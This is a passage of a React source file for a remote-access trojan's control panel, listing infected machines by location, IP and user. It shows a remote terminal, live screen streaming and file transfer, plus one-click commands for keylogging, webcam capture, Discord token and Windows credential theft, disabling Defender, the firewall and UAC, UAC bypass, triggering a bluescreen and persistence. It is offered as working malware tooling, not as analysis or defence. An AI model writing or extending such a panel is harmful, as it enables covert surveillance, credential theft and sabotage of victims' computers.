'use client'

import { useState, useEffect, useCallback, useRef } from "react"
import { motion, AnimatePresence } from "framer-motion"
import { Card, Badge, Input, Button } from "@/components/ui"
import Link from "next/link"
import toast from "react-hot-toast"
import { getFlagEmoji } from "@/lib/geo"

export default function RemoteClientsPage() {
  const [clients, setClients] = useState<any[]>([])
  const [stats, setStats] = useState<any>({ total: 0, online: 0, offline: 0, verified: 0 })
  const [search, setSearch] = useState("")
  const [loading, setLoading] = useState(true)
  const [statusFilter, setStatusFilter] = useState("all")
  const [selectedClient, setSelectedClient] = useState<any>(null)
  const [manageCmd, setManageCmd] = useState("")
  const [manageOutput, setManageOutput] = useState("")
  const [manageTab, setManageTab] = useState<"info" | "terminal" | "screenshot" | "live" | "transfer">("info")
  const [liveFrameCount, setLiveFrameCount] = useState(0)
  const [previewImage, setPreviewImage] = useState<string | null>(null)
  const [liveImage, setLiveImage] = useState<string | null>(null)
  const [screenshots, setScreenshots] = useState<any[]>([])
  const [lastCommandId, setLastCommandId] = useState<string | null>(null)
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null)
  const livePollRef = useRef<ReturnType<typeof setInterval> | null>(null)
  const liveReqRef = useRef<ReturnType<typeof setInterval> | null>(null)
  const selectedRef = useRef<any>(null)

  const fetchClients = useCallback(async () => {
    try {
      const res = await fetch("/api/remote/clients")
      const data = await res.json()
      if (data.clients) setClients(data.clients)
      if (data.stats) setStats(data.stats)
    } catch {
      toast.error("Failed to load clients")
    } finally {
      setLoading(false)
    }
  }, [])

  useEffect(() => { fetchClients(); const interval = setInterval(fetchClients, 10000); return () => clearInterval(interval) }, [fetchClients])

  useEffect(() => {
    selectedRef.current = selectedClient
    if (!selectedClient) {
      if (pollRef.current) { clearInterval(pollRef.current); pollRef.current = null }
      if (livePollRef.current) { clearInterval(livePollRef.current); livePollRef.current = null }
      if (liveReqRef.current) { clearInterval(liveReqRef.current); liveReqRef.current = null }
      setPreviewImage(null); setLiveImage(null); setScreenshots([]); setLastCommandId(null)
    }
  }, [selectedClient])

  useEffect(() => {
    return () => {
      if (pollRef.current) clearInterval(pollRef.current)
      if (livePollRef.current) clearInterval(livePollRef.current)
      if (liveReqRef.current) clearInterval(liveReqRef.current)
    }
  }, [])

  const fetchClientDetail = useCallback(async () => {
    const client = selectedRef.current
    if (!client?.id) return
    try {
      const res = await fetch(`/api/remote/clients/${client.id}`)
      const data = await res.json()
      if (data.client) {
        setSelectedClient(data.client)
        if (data.client.screenCaptures) setScreenshots(data.client.screenCaptures)
      }
    } catch {}
  }, [])

  // Poll for command result
  useEffect(() => {
    if (!lastCommandId) return
    const interval = setInterval(async () => {
      const client = selectedRef.current
      if (!client?.id) return
      try {
        const res = await fetch(`/api/remote/clients/${client.id}`)
        const data = await res.json()
        if (!data.client) return
        const cmd = data.client.commands?.find((c: any) => c.id === lastCommandId)
        if (cmd && (cmd.status === "completed" || cmd.status === "failed")) {
          setManageOutput((prev) => prev.replace("⏳ Pending execution...", cmd.output || "✅ Completed (no output)"))
          setLastCommandId(null)
          clearInterval(interval)
          setSelectedClient((prev: any) => ({ ...prev, commands: data.client.commands }))
        }
      } catch {}
    }, 2000)
    return () => clearInterval(interval)
  }, [lastCommandId])

  const filtered = clients.filter((c) => {
    const q = search.toLowerCase()
    const matchesSearch = c.hostname?.toLowerCase().includes(q) ||
      c.user?.toLowerCase().includes(q) ||
      c.ipPublic?.toLowerCase().includes(q) ||
      c.ipLocal?.toLowerCase().includes(q) ||
      c.country?.toLowerCase().includes(q) ||
      c.clientId?.toLowerCase().includes(q)
    const matchesStatus = statusFilter === "all" || c.status === statusFilter
    return matchesSearch && matchesStatus
  })



  async function handleSendCommand() {
    const client = selectedRef.current
    if (!manageCmd.trim() || !client) return
    try {
      const res = await fetch(`/api/remote/clients/${client.id}/command`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ command: manageCmd }),
      })
      const data = await res.json()
      if (!res.ok) throw new Error("Failed")
      toast.success("Command sent")
      setManageOutput((prev) => `$ ${manageCmd}\n⏳ Pending execution...\n\n${prev}`)
      setLastCommandId(data.command?.id || data.commandId)
      setManageCmd("")
    } catch {
      toast.error("Failed to send command")
    }
  }

  async function handleRequestScreenshot() {
    const client = selectedRef.current
    if (!client) return
    try {
      const res = await fetch(`/api/remote/clients/${client.id}/screenshot`, { method: "POST" })
      const data = await res.json()
      if (!res.ok) throw new Error("Failed")
      toast.success("Screenshot requested")
      setLastCommandId(data.commandId)
      if (pollRef.current) clearInterval(pollRef.current)
      let knownCount = screenshots.length
      pollRef.current = setInterval(async () => {
        const c = selectedRef.current
        if (!c?.id) return
        try {
          const r = await fetch(`/api/remote/clients/${c.id}`)
          const d = await r.json()
          if (d.client) {
            setSelectedClient(d.client)
            if (d.client.screenCaptures) {
              setScreenshots(d.client.screenCaptures)
              if (d.client.screenCaptures.length > knownCount) {
                knownCount = d.client.screenCaptures.length
                if (pollRef.current) { clearInterval(pollRef.current); pollRef.current = null }
                toast.success("Screenshot received!")
              }
            }
          }
        } catch {}
      }, 2000)
    } catch {
      toast.error("Failed to request screenshot")
    }
  }

  async function handleRequestFileList() {
    const client = selectedRef.current
    if (!client) return
    try {
      const res = await fetch(`/api/remote/clients/${client.id}/files`)
      if (!res.ok) throw new Error("Failed")
      const data = await res.json()
      if (data.transfers?.length > 0) {
        setManageOutput("📁 Recent file transfers:\n" + data.transfers.map((t: any) =>
          `  ${t.direction === "upload" ? "⬆" : "⬇"} ${t.fileName} (${t.status})`).join("\n"))
      } else {
        setManageOutput("📁 No file transfers yet.\nSend a LISTDIR command via terminal to browse files.")
      }
    } catch {
      toast.error("Failed to get file list")
    }
  }

  async function handleLiveStream() {
    setManageTab("live")
    setLiveImage(null)
    setLiveFrameCount(0)
    if (livePollRef.current) clearInterval(livePollRef.current)
    if (liveReqRef.current) clearInterval(liveReqRef.current)
    if (pollRef.current) { clearInterval(pollRef.current); pollRef.current = null }

    const doLive = async () => {
      const client = selectedRef.current
      if (!client?.id) return
      try {
        await fetch(`/api/remote/clients/${client.id}/screenshot`, { method: "POST" })
      } catch {}
      setLiveFrameCount((c) => c + 1)
    }

    let lastCount = 0
    const imgPoll = setInterval(async () => {
      const client = selectedRef.current
      if (!client?.id) return
      try {
        const res = await fetch(`/api/remote/clients/${client.id}`)
        const data = await res.json()
        if (data.client?.screenCaptures) {
          setSelectedClient(data.client)
          setScreenshots(data.client.screenCaptures)
          const caps = data.client.screenCaptures
          if (caps.length > lastCount) {
            lastCount = caps.length
            const latest = caps[0]
            if (latest?.imagePath) setLiveImage(latest.imagePath)
          }
        }
      } catch {}
    }, 2000)
    livePollRef.current = imgPoll

    const reqInterval = setInterval(doLive, 3000)
    liveReqRef.current = reqInterval
    doLive()
  }

  async function handleSendQuickCommand(cmd: string) {
    const client = selectedRef.current
    setManageTab("terminal")
    setManageCmd(cmd)
    if (!client) return
    try {
      const res = await fetch(`/api/remote/clients/${client.id}/command`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ command: cmd }),
      })
      const data = await res.json()
      if (!res.ok) throw new Error("Failed")
      toast.success(`Command sent: ${cmd}`)
      setManageOutput((prev) => `$ ${cmd}\n⏳ Pending execution...\n\n${prev}`)
      setLastCommandId(data.command?.id || data.commandId)
      setManageCmd("")
    } catch {
      toast.error("Failed to send command")
    }
  }

  return (
    <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-bold tracking-tight">Remote Clients</h1>
          <p className="text-muted-foreground mt-1">Monitor and manage all connected endpoints</p>
        </div>
        <div className="flex items-center gap-2">
          <Link href="/dashboard/remote/builders">
            <Button variant="outline" size="sm">
              <svg className="w-4 h-4 mr-1.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2" />
              </svg>
              Builders
            </Button>
          </Link>
        </div>
      </div>

      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
        {[
          { label: "Total Clients", value: stats.total, color: "text-foreground", icon: "💻" },
          { label: "Online", value: stats.online, color: "text-success", icon: "🟢" },
          { label: "Offline", value: stats.offline, color: "text-muted-foreground", icon: "🔴" },
          { label: "Verified", value: stats.verified, color: "text-primary", icon: "✅" },
        ].map((s) => (
          <div key={s.label} className="premium-card p-4">
            <div className="flex items-center justify-between mb-2">
              <span className="text-sm text-muted-foreground">{s.label}</span>
              <span className="text-lg">{s.icon}</span>
            </div>
            <div className={`text-2xl font-bold ${s.color}`}>{s.value}</div>
          </div>
        ))}
      </div>

      <Card>
        <div className="flex items-center gap-4 mb-4">
          <Input placeholder="Search by hostname, IP, user..." value={search} onChange={(e) => setSearch(e.target.value)} className="max-w-sm" />
          <select value={statusFilter} onChange={(e) => setStatusFilter(e.target.value)} className="input-premium max-w-[150px]">
            <option value="all">All Status</option>
            <option value="online">Online</option>
            <option value="offline">Offline</option>
          </select>
          <span className="text-sm text-muted-foreground ml-auto">{filtered.length} clients</span>
        </div>
        <div className="overflow-x-auto">
          <table className="w-full">
            <thead>
              <tr className="border-b border-border/50">
                <th className="text-left p-3 text-xs font-medium text-muted-foreground uppercase tracking-wider">Status</th>
                <th className="text-left p-3 text-xs font-medium text-muted-foreground uppercase tracking-wider">Country</th>
                <th className="text-left p-3 text-xs font-medium text-muted-foreground uppercase tracking-wider">User</th>
                <th className="text-left p-3 text-xs font-medium text-muted-foreground uppercase tracking-wider">Hostname</th>
                <th className="text-left p-3 text-xs font-medium text-muted-foreground uppercase tracking-wider">IP Address</th>
                <th className="text-left p-3 text-xs font-medium text-muted-foreground uppercase tracking-wider">CPU</th>
                <th className="text-left p-3 text-xs font-medium text-muted-foreground uppercase tracking-wider">RAM</th>
                <th className="text-left p-3 text-xs font-medium text-muted-foreground uppercase tracking-wider">Last Seen</th>
                <th className="text-right p-3 text-xs font-medium text-muted-foreground uppercase tracking-wider">Action</th>
              </tr>
            </thead>
            <tbody>
              {loading ? (
                [...Array(5)].map((_, i) => (
                  <tr key={i} className="border-b border-border/50">
                    <td colSpan={9} className="p-3"><div className="h-8 bg-muted rounded animate-pulse" /></td>
                  </tr>
                ))
              ) : filtered.length === 0 ? (
                <tr><td colSpan={9} className="p-8 text-center text-muted-foreground">No clients connected</td></tr>
              ) : (
                filtered.map((client) => {
                  const cpuPct = client.cpu != null ? `${client.cpu.toFixed(1)}%` : "-"
                  const ramPct = client.ramTotal ? `${((client.ramUsed || 0) / client.ramTotal * 100).toFixed(1)}%` : "-"
                  const ramStr = client.ramTotal ? `${(client.ramUsed || 0).toFixed(1)}GB / ${client.ramTotal.toFixed(1)}GB` : "-"
                  const lastSeen = new Date(client.lastSeen).getTime()
                  const now = Date.now()
                  const diff = now - lastSeen
                  const isOnline = client.status === "online" && diff < 60000
                  const lastSeenStr = diff < 60000 ? "Just now" :
                    diff < 3600000 ? `${Math.floor(diff / 60000)}m ago` :
                    diff < 86400000 ? `${Math.floor(diff / 3600000)}h ago` :
                    new Date(client.lastSeen).toLocaleDateString()
                  const flag = getFlagEmoji(client.countryCode) || "🌍"

                  return (
                    <tr key={client.id} className="border-b border-border/50 last:border-0 hover:bg-muted/20 transition-colors">
                      <td className="p-3">
                        <Badge variant={isOnline ? "success" : "secondary"}>
                          <span className={`w-1.5 h-1.5 rounded-full mr-1.5 inline-block ${isOnline ? "bg-green-500 animate-pulse" : "bg-muted-foreground"}`} />
                          {isOnline ? "Online" : "Offline"}
                        </Badge>
                      </td>
                      <td className="p-3">
                        <span className="text-lg" title={client.country || "Unknown"}>{flag}</span>
                        <span className="text-xs ml-1 text-muted-foreground">{client.country || ""}</span>
                        {client.city && <span className="text-[10px] ml-0.5 text-muted-foreground/50">· {client.city}</span>}
                      </td>
                      <td className="p-3">
                        <span className="text-sm font-medium">{client.user || "-"}</span>
                      </td>
                      <td className="p-3">
                        <span className="text-sm font-mono font-medium">{client.hostname || "-"}</span>
                      </td>
                      <td className="p-3">
                        <div className="text-sm font-mono">{client.ipPublic || "-"}</div>
                        <div className="text-[10px] text-muted-foreground font-mono">{client.ipLocal || ""}</div>
                      </td>
                      <td className="p-3">
                        <div className="flex items-center gap-2">
                          <div className="w-16 h-1.5 bg-muted rounded-full overflow-hidden">
                            <div className="h-full rounded-full transition-all" style={{
                              width: `${client.cpu || 0}%`,
                              backgroundColor: (client.cpu || 0) > 80 ? "hsl(var(--destructive))" :
                                (client.cpu || 0) > 50 ? "hsl(var(--warning))" : "hsl(var(--primary))",
                            }} />
                          </div>
                          <span className="text-xs font-mono">{cpuPct}</span>
                        </div>
                      </td>
                      <td className="p-3">
                        <div className="flex items-center gap-2">
                          <div className="w-16 h-1.5 bg-muted rounded-full overflow-hidden">
                            <div className="h-full rounded-full transition-all" style={{
                              width: client.ramTotal ? `${(client.ramUsed || 0) / client.ramTotal * 100}%` : "0%",
                              backgroundColor: "hsl(var(--primary))",
                            }} />
                          </div>
                          <span className="text-xs font-mono">{ramStr}</span>
                        </div>
                      </td>
                      <td className="p-3">
                        <span className="text-xs text-muted-foreground">{lastSeenStr}</span>
                      </td>
                      <td className="p-3 text-right">
                        <button
                          onClick={async () => { try { const res = await fetch(`/api/remote/clients/${client.id}`); const data = await res.json(); setSelectedClient(data.client) } catch { setSelectedClient(client) }; setManageTab("info"); setManageOutput("") }}
                          className="px-3 py-1.5 rounded-lg text-xs font-medium bg-primary/10 text-primary hover:bg-primary/20 transition-all"
                        >
                          Management
                        </button>
                      </td>
                    </tr>
                  )
                })
              )}
            </tbody>
          </table>
        </div>
      </Card>

      <AnimatePresence>
        {selectedClient && (
          <>
            <div className="fixed inset-0 z-50 bg-black/40 backdrop-blur-sm" onClick={() => { setSelectedClient(null); if (livePollRef.current) clearInterval(livePollRef.current); if (liveReqRef.current) clearInterval(liveReqRef.current); if (pollRef.current) clearInterval(pollRef.current) }} />
            <div className="fixed inset-0 z-50 flex items-center justify-center pointer-events-none">
              <motion.div
                initial={{ opacity: 0, scale: 0.92, y: 20 }}
                animate={{ opacity: 1, scale: 1, y: 0 }}
                exit={{ opacity: 0, scale: 0.92, y: 20 }}
                className="pointer-events-auto w-full max-w-3xl mx-4 max-h-[85vh] overflow-y-auto"
              >
                <div className="glass-card rounded-2xl p-5 shadow-2xl border border-white/5">
                  <div className="flex items-center justify-between mb-4 pb-4 border-b border-border/50">
                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-primary to-purple-600 flex items-center justify-center text-white text-sm font-bold">
                        {selectedClient.hostname?.[0]?.toUpperCase() || "?"}
                      </div>
                      <div>
                        <h3 className="font-semibold">{selectedClient.hostname || selectedClient.clientId}</h3>
                        <div className="flex items-center gap-2 text-xs text-muted-foreground">
                          <span>{selectedClient.user}</span>
                          <span>·</span>
                          <span className="font-mono">{selectedClient.ipPublic}</span>
                        </div>
                      </div>
                    </div>
                    <div className="flex items-center gap-2">
                      <Badge variant={selectedClient.status === "online" ? "success" : "secondary"}>
                        {selectedClient.status}
                      </Badge>
                      <button
                        onClick={() => { setSelectedClient(null); if (livePollRef.current) clearInterval(livePollRef.current); if (liveReqRef.current) clearInterval(liveReqRef.current); if (pollRef.current) clearInterval(pollRef.current) }}
                        className="w-8 h-8 rounded-lg hover:bg-muted/50 flex items-center justify-center transition-colors text-muted-foreground hover:text-foreground"
                      >
                        <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M18 6L6 18M6 6l12 12"/></svg>
                      </button>
                    </div>
                  </div>

                  <div className="flex gap-1 mb-4 p-1 glass rounded-xl w-fit">
                    {[
                      { id: "info" as const, label: "Info", icon: "M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" },
                      { id: "terminal" as const, label: "Terminal", icon: "M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z M14 2v6h6" },
                      { id: "screenshot" as const, label: "Screenshot", icon: "M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z" },
                      { id: "live" as const, label: "Live", icon: "M2 4a2 2 0 012-2h16a2 2 0 012 2v10a2 2 0 01-2 2H4a2 2 0 01-2-2V4z" },
                      { id: "transfer" as const, label: "Transfer", icon: "M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12" },
                    ].map((tab) => (
                      <button
                        key={tab.id}
                        onClick={() => { setManageTab(tab.id); if (tab.id === "live") handleLiveStream() }}
                        className={`flex items-center gap-1.5 px-3.5 py-2 rounded-lg text-xs font-medium transition-all ${
                          manageTab === tab.id ? "bg-primary/10 text-primary shadow-sm" : "text-muted-foreground hover:text-foreground"
                        }`}
                      >
                        <svg className="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d={tab.icon} /></svg>
                        {tab.label}
                      </button>
                    ))}
                  </div>

                  <div className="min-h-[200px]">
                    {manageTab === "info" && (
                      <div className="grid grid-cols-2 gap-4">
                        <div className="space-y-2">
                          {[
                            { label: "Hostname", value: selectedClient.hostname },
                            { label: "User", value: selectedClient.user },
                            { label: "OS", value: selectedClient.os },
                            { label: "Public IP", value: selectedClient.ipPublic },
                            { label: "Local IP", value: selectedClient.ipLocal },
                          ].map((item) => (
                            <div key={item.label} className="flex justify-between text-sm">
                              <span className="text-muted-foreground">{item.label}</span>
                              <span className="font-mono font-medium">{item.value || "-"}</span>
                            </div>
                          ))}
                        </div>
                        <div className="space-y-2">
                          {[
                            { label: "CPU", value: selectedClient.cpu != null ? `${selectedClient.cpu.toFixed(1)}%` : "-" },
                            { label: "RAM", value: selectedClient.ramTotal ? `${(selectedClient.ramUsed || 0).toFixed(1)}/${selectedClient.ramTotal.toFixed(1)}GB` : "-" },
                            { label: "Country", value: `${getFlagEmoji(selectedClient.countryCode)} ${selectedClient.country || "-"}` },
                            { label: "City", value: selectedClient.city || "-" },
                            { label: "ISP", value: selectedClient.isp || "-" },
                          ].map((item) => (
                            <div key={item.label} className="flex justify-between text-sm">
                              <span className="text-muted-foreground">{item.label}</span>
                              <span className="font-mono font-medium">{item.value || "-"}</span>
                            </div>
                          ))}
                        </div>
                        <div className="col-span-2 flex gap-2 mt-2">
                          <button onClick={handleRequestScreenshot} className="flex-1 p-3 rounded-xl border border-border/50 hover:bg-muted/30 transition-all text-sm flex items-center justify-center gap-2">
                            <span>📸</span> Screenshot
                          </button>
                          <button onClick={() => setManageTab("terminal")} className="flex-1 p-3 rounded-xl border border-border/50 hover:bg-muted/30 transition-all text-sm flex items-center justify-center gap-2">
                            <span>💻</span> Open Terminal
                          </button>
                          <button onClick={handleRequestFileList} className="flex-1 p-3 rounded-xl border border-border/50 hover:bg-muted/30 transition-all text-sm flex items-center justify-center gap-2">
                            <span>📁</span> View Files
                          </button>
                          <button onClick={handleLiveStream} className="flex-1 p-3 rounded-xl border border-border/50 hover:bg-muted/30 transition-all text-sm flex items-center justify-center gap-2">
                            <span>📺</span> Screen Stream
                          </button>
                        </div>
                        <div className="col-span-2">
                          <h4 className="text-xs font-semibold text-muted-foreground uppercase tracking-wider mb-2">Quick Actions</h4>
                          <div className="space-y-2">
                            <div className="flex gap-1.5 flex-wrap">
                              <span className="text-[10px] text-muted-foreground/60 uppercase tracking-wider mr-1 self-center">Core</span>
                              <button onClick={() => handleSendQuickCommand("!ADMINCHECK")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Check if running as admin">!admincheck</button>
                              <button onClick={() => handleSendQuickCommand("!SYSINFO")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Full system info">!sysinfo</button>
                              <button onClick={() => handleSendQuickCommand("!PUBLICIP")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Get public IP">!publicip</button>
                              <button onClick={() => handleSendQuickCommand("!HELP")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Show all commands">!help</button>
                            </div>
                            <div className="flex gap-1.5 flex-wrap">
                              <span className="text-[10px] text-muted-foreground/60 uppercase tracking-wider mr-1 self-center">System</span>
                              <button onClick={() => handleSendQuickCommand("SHUTDOWN")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Shutdown PC">!shutdown</button>
                              <button onClick={() => handleSendQuickCommand("RESTART")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Restart PC">!restart</button>
                              <button onClick={() => handleSendQuickCommand("!LOGOFF")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Log off user">!logoff</button>
                              <button onClick={() => handleSendQuickCommand("LOCK")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Lock workstation">!lock</button>
                              <button onClick={() => handleSendQuickCommand("!ELEVATE")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Elevate to admin">!elevate</button>
                              <button onClick={() => handleSendQuickCommand("!DISABLEUAC")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Disable UAC">!disableuac</button>
                              <button onClick={() => handleSendQuickCommand("!BLUESCREEN")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Trigger BSOD">!bluescreen</button>
                            </div>
                            <div className="flex gap-1.5 flex-wrap">
                              <span className="text-[10px] text-muted-foreground/60 uppercase tracking-wider mr-1 self-center">Input</span>
                              <button onClick={() => handleSendQuickCommand("!BLOCK")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Block mouse+keyboard">!block</button>
                              <button onClick={() => handleSendQuickCommand("!UNBLOCK")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Unblock input">!unblock</button>
                              <button onClick={() => handleSendQuickCommand("!DISABLETASKMGR")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Disable task manager">!disabletaskmgr</button>
                              <button onClick={() => handleSendQuickCommand("!ENABLETASKMGR")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Enable task manager">!enabletaskmgr</button>
                            </div>
                            <div className="flex gap-1.5 flex-wrap">
                              <span className="text-[10px] text-muted-foreground/60 uppercase tracking-wider mr-1 self-center">Process</span>
                              <button onClick={() => handleSendQuickCommand("!LISTPROCESS")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="List all processes">!listprocess</button>
                              <button onClick={() => handleSendQuickCommand("!PROCKILL notepad")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Kill process by name">!prockill</button>
                              <button onClick={() => handleSendQuickCommand("!BEEP")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Play beep sound">!beep</button>
                            </div>
                            <div className="flex gap-1.5 flex-wrap">
                              <span className="text-[10px] text-muted-foreground/60 uppercase tracking-wider mr-1 self-center">Files</span>
                              <button onClick={() => handleSendQuickCommand("!DIR C:\\")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="List C: drive">!dir C:\</button>
                              <button onClick={() => handleSendQuickCommand("!CURRENTDIR")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Current working dir">!currentdir</button>
                              <button onClick={() => handleSendQuickCommand("!CD C:\\Users")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Change directory">!cd</button>
                              <button onClick={() => handleSendQuickCommand("!DOWNLOAD somefile.txt")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Download file from server">!download</button>
                              <button onClick={() => handleSendQuickCommand("!UPLOAD test.txt|C:\\test.txt")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Upload file to server">!upload</button>
                              <button onClick={() => handleSendQuickCommand("!DELETE C:\\temp\\test.txt")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Delete file/folder">!delete</button>
                              <button onClick={() => handleSendQuickCommand("!DOWNLOADFOLDER C:\\temp")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Zip and upload folder">!downloadfolder</button>
                            </div>
                            <div className="flex gap-1.5 flex-wrap">
                              <span className="text-[10px] text-muted-foreground/60 uppercase tracking-wider mr-1 self-center">Surveillance</span>
                              <button onClick={() => handleSendQuickCommand("!SCREENSHOT")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Capture screen">!screenshot</button>
                              <button onClick={() => handleSendQuickCommand("!WEBCAMPIC")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Capture webcam">!webcampic</button>
                              <button onClick={() => handleSendQuickCommand("!GETCAMS")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="List cameras">!getcams</button>
                              <button onClick={() => handleSendQuickCommand("!CLIPBOARD")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Read clipboard">!clipboard</button>
                              <button onClick={() => handleSendQuickCommand("!IDLETIME")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="System idle time">!idletime</button>
                              <button onClick={() => handleSendQuickCommand("!KEYLOG")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Toggle keylogger">!keylog</button>
                            </div>
                            <div className="flex gap-1.5 flex-wrap">
                              <span className="text-[10px] text-muted-foreground/60 uppercase tracking-wider mr-1 self-center">Network</span>
                              <button onClick={() => handleSendQuickCommand("!IPINFO")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="IP information">!ipinfo</button>
                              <button onClick={() => handleSendQuickCommand("!GEOLOCATE")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Geolocation">!geolocate</button>
                              <button onClick={() => handleSendQuickCommand("!WIFI")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="List WiFi networks">!wifi</button>
                              <button onClick={() => handleSendQuickCommand("ipconfig /all")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="IP config">ipconfig</button>
                              <button onClick={() => handleSendQuickCommand("netstat -an")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Network connections">netstat</button>
                            </div>
                            <div className="flex gap-1.5 flex-wrap">
                              <span className="text-[10px] text-muted-foreground/60 uppercase tracking-wider mr-1 self-center">Security</span>
                              <button onClick={() => handleSendQuickCommand("!DISABLEDEFENDER")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Disable Defender">!disabledefender</button>
                              <button onClick={() => handleSendQuickCommand("!DISABLEFIREWALL")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Disable firewall">!disablefirewall</button>
                              <button onClick={() => handleSendQuickCommand("!PASSWORD")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Windows credentials">!password</button>
                              <button onClick={() => handleSendQuickCommand("!GRABTOKENS")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Discord tokens">!grabtokens</button>
                              <button onClick={() => handleSendQuickCommand("!DISCORDINFO")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Discord info">!discordinfo</button>
                              <button onClick={() => handleSendQuickCommand("!UACBYPASS")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Bypass UAC">!uacbypass</button>
                            </div>
                            <div className="flex gap-1.5 flex-wrap">
                              <span className="text-[10px] text-muted-foreground/60 uppercase tracking-wider mr-1 self-center">Apps</span>
                              <button onClick={() => handleSendQuickCommand("!STEAM")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Steam info">!steam</button>
                              <button onClick={() => handleSendQuickCommand("!TELEGRAM")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Telegram info">!telegram</button>
                              <button onClick={() => handleSendQuickCommand("!EMAIL")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Email clients">!email</button>
                            </div>
                            <div className="flex gap-1.5 flex-wrap">
                              <span className="text-[10px] text-muted-foreground/60 uppercase tracking-wider mr-1 self-center">Persistence</span>
                              <button onClick={() => handleSendQuickCommand("!STARTUP")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Add to startup">!startup</button>
                              <button onClick={() => handleSendQuickCommand("!CRITPROC")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Make critical process">!critproc</button>
                              <button onClick={() => handleSendQuickCommand("!UNCRITPROC")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Unmake critical">!uncritproc</button>
